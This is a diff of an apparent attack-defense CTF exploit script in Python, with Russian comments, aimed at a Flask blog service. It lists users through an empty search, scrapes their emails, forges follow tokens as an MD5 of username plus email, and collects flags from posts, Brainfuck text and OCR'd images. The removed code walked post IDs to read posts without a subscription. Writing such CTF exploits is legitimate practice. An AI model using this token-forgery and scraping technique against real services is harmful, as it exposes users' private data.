@@ -1,14 +1,12 @@
 #!/usr/bin/env python3
 
-# Четвертая уязвимость - возможность смотреть посты без подписки
+# Первая уязвимость - слабый токен. Здесь также используется возможность поиска по пустой строке
 import requests
 from requests.auth import HTTPBasicAuth
-import json
-import time
-import easyocr
 from hashlib import md5
 import re
-import sys
+import sys  
+import easyocr
  
 import bfParser
 
@@ -19,13 +17,20 @@ with requests.Session() as s:
     csrf = re.findall('name="csrf_token" type="hidden" value="(.*)"', p.text)
     headers = {'Content-type': 'application/x-www-form-urlencoded'}
     p = s.post('http://{}:5000/login?next=%2Fhome'.format(ip), data = 'csrf_token={}&username=wee&password=wee&submit=Sign+In'.format(csrf[0]).encode('UTF-8'), headers = headers)
-    data = 'csrf_token={}&title=a&text=b'.format(csrf[0]).encode('UTF-8')
-    p = s.post('http://{}:5000/create-post'.format(ip), data = data, headers = headers)
-    posts = re.findall('<a href="/post/(\d*)" class="btn btn-outline-secondary"> View post </a>', p.text)
+    
+    p = s.post('http://{}:5000/search'.format(ip), data = 'csrf_token={}&order=date_created&search='.format(csrf[0]).encode('UTF-8'), headers = headers)
+    users = re.findall('<form action="/follow/(.*)" method="post">', p.text)
     #
-    print(posts)
-    for i in range(int(posts[0])-10, int(posts[0])):
-        p = s.get('http://{}:5000/post/{}'.format(ip, i))
+    for user in users:
+        p = s.get('http://{}:5000/user/{}'.format(ip, user))
+        emails = re.findall('<p>(.*@.*\..*)</p>', p.text)
+        data = user + emails[0]
+        token = md5(data.encode('utf-8')).hexdigest()
+        req = 'csrf_token={}&token={}'.format(csrf[0], token)
+        p = s.post('http://{}:5000/follow/{}'.format(ip, user), data = req.encode('UTF-8'), headers = headers)
+        
+        if "You are following" not in p.text:
+            continue
         posts = re.findall('TEAM\d{3}_[A-Z0-9]{32}', p.text)
         print(posts) # Получили все флаги, хранящиеся в открытом виде
         
@@ -34,9 +39,7 @@ with requests.Session() as s:
             bf = bf.replace("&gt;",">")
             bf = bf.replace("&lt;","<")
             res = bfParser.evaluate(bf)
-            print(res) # Получили флаги, хранящиеся в виде брейнфак кода
-
-        
+            print(res)
         images = re.findall('src=" /image/(.*).png"', p.text)
         for image in images:
             p = s.get('http://{}:5000/image/{}.png'.format(ip, image))
@@ -48,4 +51,5 @@ with requests.Session() as s:
             result = ' '.join(result)
             nums = re.findall(r'\d\d', result)
             flag2 = ''.join((chr(int(c))) for c in nums)
-            print(flag2) # Получили флаги из картинок
+            print(flag2)
+        
